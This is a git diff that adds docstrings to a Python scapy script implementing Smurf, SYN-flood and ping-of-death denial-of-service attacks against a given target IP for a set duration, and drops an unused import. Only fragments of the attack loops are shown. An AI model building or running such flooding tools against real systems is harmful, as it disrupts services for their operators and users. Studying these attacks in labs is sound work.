@@ -1,4 +1,3 @@
-import socket
 import scapy.all as scapy
 import time
 
@@ -7,6 +6,15 @@ import time
 
 
 def Smurf_Attack(IP_Source, IP_Dest, duree):
+    """ Smurf attack
+    Distributed denial of service (DDoS) attack in which an attacker attempts 
+    to saturate a target server with ICMP packets
+
+    Args:
+        IP_Source (String): the IP of the source machine
+        IP_Dest (String): the IP of the destination machine
+        duree (int): the duration of the attack
+    """
     print("Smurf attack on " + IP_Dest + " for " + str(duree) + " seconds")
     debut = time.time()
     while (time.time() - debut) < duree:
@@ -14,6 +22,14 @@ def Smurf_Attack(IP_Source, IP_Dest, duree):
 
 
 def Syn_Flooding_Attack(IP_Dest, duree):
+    """ Syn flooding attack
+    Computer attack aiming at achieving a denial of service. 
+    It is applied within the TCP protocol and consists in sending a succession of SYN requests to the target
+
+    Args:
+        IP_Dest (String): the IP of the destination machine
+        duree (int): the duration of the attack
+    """
     print("Syn flooding attack on " + IP_Dest +
           " for " + str(duree) + " seconds")
     topt = [('Timestamp', (10, 0))]
@@ -25,6 +41,13 @@ def Syn_Flooding_Attack(IP_Dest, duree):
 
 
 def Ping_of_death(IP_Dest, duree):
+    """ Ping of death attack
+    Denial of service attack performed by sending a malformed ping packet to a target machine
+
+    Args:
+        IP_Dest (String): the IP of the destination machine
+        duree (int): the duration of the attack
+    """
     print("Ping of death attack on " + IP_Dest +
           " for " + str(duree) + " seconds")
     debut = time.time()
